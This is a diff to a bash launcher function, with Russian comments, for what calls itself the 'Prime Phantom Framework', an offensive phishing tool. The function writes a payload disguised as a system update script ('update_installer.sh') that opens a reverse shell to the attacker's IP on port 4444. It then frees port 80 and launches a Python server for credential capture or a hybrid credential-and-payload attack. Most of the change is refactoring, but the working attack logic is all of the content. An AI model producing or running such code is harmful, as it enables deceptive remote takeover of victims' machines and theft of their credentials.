@@ -953,57 +953,62 @@ run_phantom_engine() {
     clear
     print_header "PRIME PHANTOM FRAMEWORK"
 
+    # Используем наши эвристические переменные (уже определены в начале launcher.sh)
+    local local_ip="${CURRENT_IP:-127.0.0.1}"
+    local my_host="${HOSTNAME:-localhost}"
+    
     local srv_path="/root/phantom_srv.py"
-    local payload_path="$LOOT_DIR/update_installer.sh"
+    # Эвристическое имя файла для доставки
+    local payload_name="update_installer.sh"
+    local payload_path="$LOOT_DIR/$payload_name"
 
-    # Вызываем меню. Оно запишет 1, 2 или 3 в CHOICE
     select_option "SELECT STRATEGY:" \
         "Credential Capture" \
         "Full Hybrid (Creds + Payload)" \
         "Cancel"
     
     local btn="$CHOICE"
-
-    # Выход, если отмена или пустой ввод
     [[ -z "$btn" || "$btn" == "3" ]] && return
 
-    # Логика выбора стратегии на основе цифр
     local attack_type=""
-    if [[ "$btn" == "1" ]]; then
-        attack_type="creds"
-    elif [[ "$btn" == "2" ]]; then
-        attack_type="hybrid"
-    fi
+    [[ "$btn" == "1" ]] && attack_type="creds"
+    [[ "$btn" == "2" ]] && attack_type="hybrid"
 
-    # Создаем полезную нагрузку
-    print_status "i" "Forging payload..."
-    local local_ip=$(hostname -I | awk '{print $1}' || echo "127.0.0.1")
+    # --- ФАЗА ГЕНЕРАЦИИ (БЕЗ ОШИБОК HOSTNAME) ---
+    print_status "i" "Forging payload for $my_host..."
     
+    # Создаем Payload, используя чистый IP
     cat <<EOF > "$payload_path"
 #!/bin/bash
-echo 'Updating system...'
+# System update for $my_host
+echo 'Updating system components...'
 bash -i >& /dev/tcp/$local_ip/4444 0>&1 &
 EOF
     chmod +x "$payload_path"
 
-    # Вызов генератора Python-кода
+    # --- ФАЗА АКТИВАЦИИ ---
     if command -v python3 >/dev/null; then
         generate_phantom_server_code "$srv_path" "$attack_type"
         
         print_status "w" "Activating Phantom Gate on port 80..."
-        # Убиваем старые процессы на порту 80 (требует root или sudo)
+        # Очистка порта (тихий режим)
         fuser -k 80/tcp >/dev/null 2>&1
         
-        # Запуск сервера в фоне
+        # Запуск сервера
         python3 "$srv_path" > /dev/null 2>&1 &
         
         print_status "s" "PHANTOM GATEWAY OPERATIONAL"
-        print_list "Gateway Info" \
-            "Local URL: http://$local_ip" \
-            "Payload:   $payload_path" \
-            "Strategy:  $attack_type"
+        
+        # Вывод информации (Чистая эвристика)
+        print_line
+        echo -e "${Y}--- Gateway Info ---${NC}"
+        echo -e "${G} >> Local URL:${NC} http://${local_ip}"
+        echo -e "${G} >> Payload:${NC}   /${payload_name}"
+        echo -e "${G} >> Strategy:${NC}  ${attack_type}"
+        echo -e "${G} >> Hostname:${NC}  ${my_host}"
+        print_line
     else
-        print_status "e" "Python3 not found. Engine failed."
+        print_status "e" "Python3 missing. Operation aborted."
     fi
 
     echo ""
